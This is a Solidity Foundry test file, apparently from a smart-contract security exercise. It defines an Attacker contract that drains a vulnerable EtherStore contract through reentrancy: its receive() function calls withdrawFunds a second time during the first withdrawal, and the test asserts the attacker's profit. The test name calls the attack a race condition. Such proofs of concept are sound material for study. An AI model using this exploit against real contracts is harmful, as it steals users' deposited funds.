// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "../src/EtherStore.sol";
import "forge-std/Test.sol";

contract ExploitTest is Test {
    EtherStore etherStore;
    Attacker attacker;

    function setUp() public {
        etherStore = new EtherStore();
        attacker = new Attacker(address(etherStore));

        // Seed the EtherStore with some ether from a victim
        address victim = address(0x1);
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        etherStore.deposit{value: 10 ether}();

        // Fund the attacker with some ether to start the attack
        vm.deal(address(attacker), 1 ether);
    }

    function testRaceConditionWithdrawalAttack() public {
        uint256 attackerInitialBalance = address(attacker).balance;

        // Execute the attack
        attacker.attack();

        // Check that the attacker has gained more ether than they initially had
        assertGt(address(attacker).balance, attackerInitialBalance);
    }
}

contract Attacker {
    EtherStore public etherStore;
    bool public attackInProgress;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attack() external {
        attackInProgress = true;
        etherStore.deposit{value: 1 ether}();
        etherStore.withdrawFunds(1 ether);
    }

    receive() external payable {
        if (attackInProgress) {
            attackInProgress = false;
            etherStore.withdrawFunds(1 ether);
        }
    }
}